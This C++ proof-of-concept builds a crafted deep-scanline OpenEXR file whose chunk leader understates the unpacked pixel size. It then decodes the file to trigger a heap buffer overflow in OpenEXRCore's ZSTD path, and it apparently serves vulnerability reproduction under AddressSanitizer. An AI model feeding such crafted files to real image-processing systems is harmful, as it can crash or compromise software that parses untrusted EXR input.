// PoC: heap buffer overflow while decoding a crafted ZSTD-compressed
// deep-scanline EXR chunk (OpenEXRCore decode path).
//
// The input is a syntactically valid single-part deep scanline EXR
// (1x1 data window, one HALF channel, ZSTD compression): the version
// word carries the non-image bit, the required attributes are present,
// and the single chunk holds a well-formed sample-count table and a
// well-formed EXR-ZSTD pixel payload.  The only lie is in the deep
// chunk leader: it declares an unpacked pixel size (8) smaller than
// the half-data byte count the sample-count table implies (8 samples
// * 2 bytes = 16), so the first inner segment of the shuffled stream
// is written past the end of the scratch buffer sized from the
// leader value.
//
// Build against an AddressSanitizer build of OpenEXR, then run:
//   ./pocs/residual [path/to/crafted.exr]
// The crafted file is (re)created by this program before decoding it.

#include <cstdio>
#include <cstdint>
#include <cstring>
#include <cstdlib>
#include <string>
#include <vector>

#include <zstd.h>

#include <openexr.h>

namespace
{

void
put_u32 (std::vector<uint8_t>& v, uint32_t x)
{
    for (int i = 0; i < 4; ++i)
        v.push_back ((uint8_t) ((x >> (8 * i)) & 0xffu));
}

void
put_u64 (std::vector<uint8_t>& v, uint64_t x)
{
    for (int i = 0; i < 8; ++i)
        v.push_back ((uint8_t) ((x >> (8 * i)) & 0xffu));
}

void
put_f32 (std::vector<uint8_t>& v, float f)
{
    uint32_t x;
    std::memcpy (&x, &f, 4);
    put_u32 (v, x);
}

void
put_str (std::vector<uint8_t>& v, const char* s)
{
    while (*s) v.push_back ((uint8_t) *s++);
    v.push_back (0);
}

// EXR-ZSTD chunk container: 24-byte header + one ZSTD frame of `inner`.
std::vector<uint8_t>
zstd_container (const std::vector<uint8_t>& inner)
{
    size_t const cbound = ZSTD_compressBound (inner.size ());
    std::vector<uint8_t> out (24 + cbound);
    size_t const         csize = ZSTD_compress (
        out.data () + 24, cbound, inner.data (), inner.size (), 3);
    if (ZSTD_isError (csize))
    {
        std::fprintf (stderr, "zstd compress failed\n");
        std::exit (2);
    }
    out.resize (24 + csize);

    const uint64_t magic = 8248453963162350458ULL; // "zstd-exr"
    for (int i = 0; i < 8; ++i)
        out[i] = (uint8_t) ((magic >> (8 * i)) & 0xffu);
    out[8]  = 1; // format: wire v1
    out[9]  = 0;
    out[10] = 0;
    out[11] = 0;
    out[12] = 0; // flags: 0 for v1
    out[13] = 0;
    out[14] = 0;
    out[15] = 0;
    for (int i = 0; i < 8; ++i)
        out[16 + i] = (uint8_t) ((csize >> (8 * i)) & 0xffu);
    return out;
}

void
put_attr (
    std::vector<uint8_t>& v,
    const char*           name,
    const char*           type,
    const uint8_t*        data,
    uint32_t              sz)
{
    put_str (v, name);
    put_str (v, type);
    put_u32 (v, sz);
    v.insert (v.end (), data, data + sz);
}

std::vector<uint8_t>
make_file ()
{
    std::vector<uint8_t> f;

    put_u32 (f, 0x01312f76u);              // magic
    put_u32 (f, 2u | 0x800u);              // version 2, non-image (deep) data

    { // channels: one HALF channel "H"
        std::vector<uint8_t> ch;
        put_str (ch, "H");
        put_u32 (ch, 1);  // HALF
        ch.push_back (0); // pLinear
        ch.push_back (0);
        ch.push_back (0);
        ch.push_back (0); // reserved
        put_u32 (ch, 1);  // xSampling
        put_u32 (ch, 1);  // ySampling
        ch.push_back (0); // end of chlist
        put_attr (f, "channels", "chlist", ch.data (), (uint32_t) ch.size ());
    }

    { // compression: ZSTD
        uint8_t c = 13;
        put_attr (f, "compression", "compression", &c, 1);
    }

    { // dataWindow / displayWindow: 1x1 at the origin
        std::vector<uint8_t> b;
        put_u32 (b, 0);
        put_u32 (b, 0);
        put_u32 (b, 0);
        put_u32 (b, 0);
        put_attr (f, "dataWindow", "box2i", b.data (), 16);
        put_attr (f, "displayWindow", "box2i", b.data (), 16);
    }

    { // lineOrder: increasing y
        uint8_t lo = 0;
        put_attr (f, "lineOrder", "lineOrder", &lo, 1);
    }

    { // pixelAspectRatio: 1
        std::vector<uint8_t> v;
        put_f32 (v, 1.f);
        put_attr (f, "pixelAspectRatio", "float", v.data (), 4);
    }

    { // screenWindowCenter: (0, 0)
        std::vector<uint8_t> v;
        put_f32 (v, 0.f);
        put_f32 (v, 0.f);
        put_attr (f, "screenWindowCenter", "v2f", v.data (), 8);
    }

    { // screenWindowWidth: 1
        std::vector<uint8_t> v;
        put_f32 (v, 1.f);
        put_attr (f, "screenWindowWidth", "float", v.data (), 4);
    }

    { // type: deepscanline (required for the v2 non-image bit)
        const char*         t = "deepscanline";
        std::vector<uint8_t> v (t, t + 12);
        put_attr (f, "type", "string", v.data (), 12);
    }

    f.push_back (0); // end of header

    // offset table: one chunk (1 scanline, 1 line per chunk for ZSTD)
    put_u64 (f, 0); // placeholder, patched below

    const size_t chunk_off = f.size ();

    // Sample-count table payload: inner = [u64 4][i32 8]; the single
    // pixel claims 8 samples, so the half-data byte count is 8 * 2 = 16.
    std::vector<uint8_t> table_inner;
    put_u64 (table_inner, 4);
    put_u32 (table_inner, 8);
    std::vector<uint8_t> table_payload = zstd_container (table_inner);

    // Pixel payload: inner = [u64 16][16 bytes]; the first (half)
    // segment is 16 bytes long, exceeding the 8-byte destination.
    std::vector<uint8_t> pixel_inner;
    put_u64 (pixel_inner, 16);
    for (int i = 0; i < 16; ++i)
        pixel_inner.push_back (0xa5u + (uint8_t) i);
    std::vector<uint8_t> pixel_payload = zstd_container (pixel_inner);

    // deep scanline chunk leader: i32 y, i64 table size, i64 packed
    // size, i64 unpacked size
    put_u32 (f, 0);
    put_u64 (f, table_payload.size ());
    put_u64 (f, pixel_payload.size ());
    put_u64 (f, 8); // declared unpacked pixel size
    f.insert (f.end (), table_payload.begin (), table_payload.end ());
    f.insert (f.end (), pixel_payload.begin (), pixel_payload.end ());

    // patch the offset table entry
    for (int i = 0; i < 8; ++i)
        f[chunk_off - 8 + i] =
            (uint8_t) (((uint64_t) chunk_off >> (8 * i)) & 0xffu);
    return f;
}

void
write_file (const std::string& path, const std::vector<uint8_t>& v)
{
    FILE* f = std::fopen (path.c_str (), "wb");
    if (!f)
    {
        std::fprintf (stderr, "cannot write %s\n", path.c_str ());
        std::exit (2);
    }
    std::fwrite (v.data (), 1, v.size (), f);
    std::fclose (f);
}

void
err_cb (exr_const_context_t ctxt, int code, const char* msg)
{
    (void) ctxt;
    std::fprintf (stderr, "[openexr error %d] %s\n", code, msg);
}

} // namespace

int
main (int argc, char** argv)
{
    std::string path = (argc > 1) ? argv[1] : "/tmp/crafted_deep_zstd.exr";

    write_file (path, make_file ());
    std::printf ("wrote crafted deep ZSTD scanline file %s\n", path.c_str ());
    std::fflush (stdout);

    exr_context_initializer_t cinit = EXR_DEFAULT_CONTEXT_INITIALIZER;
    cinit.error_handler_fn          = err_cb;

    exr_context_t ctxt = nullptr;
    exr_result_t  rv   = exr_start_read (&ctxt, path.c_str (), &cinit);
    if (rv != EXR_ERR_SUCCESS)
    {
        std::fprintf (stderr, "exr_start_read failed: %d\n", (int) rv);
        return 1;
    }

    exr_chunk_info_t cinfo;
    rv = exr_read_scanline_chunk_info (ctxt, 0, 0, &cinfo);
    if (rv != EXR_ERR_SUCCESS)
    {
        std::fprintf (
            stderr, "exr_read_scanline_chunk_info failed: %d\n", (int) rv);
        return 1;
    }

    exr_decode_pipeline_t decoder = EXR_DECODE_PIPELINE_INITIALIZER;
    rv = exr_decoding_initialize (ctxt, 0, &cinfo, &decoder);
    if (rv != EXR_ERR_SUCCESS)
    {
        std::fprintf (stderr, "exr_decoding_initialize failed: %d\n", (int) rv);
        return 1;
    }
    rv = exr_decoding_choose_default_routines (ctxt, 0, &decoder);
    if (rv != EXR_ERR_SUCCESS)
    {
        std::fprintf (
            stderr, "exr_decoding_choose_default_routines failed: %d\n",
            (int) rv);
        return 1;
    }

    std::printf ("decoding crafted chunk\n");
    std::fflush (stdout);
    rv = exr_decoding_run (ctxt, 0, &decoder);
    std::printf ("exr_decoding_run returned %d\n", (int) rv);

    exr_decoding_destroy (ctxt, &decoder);
    exr_finish (&ctxt);
    return 0;
}
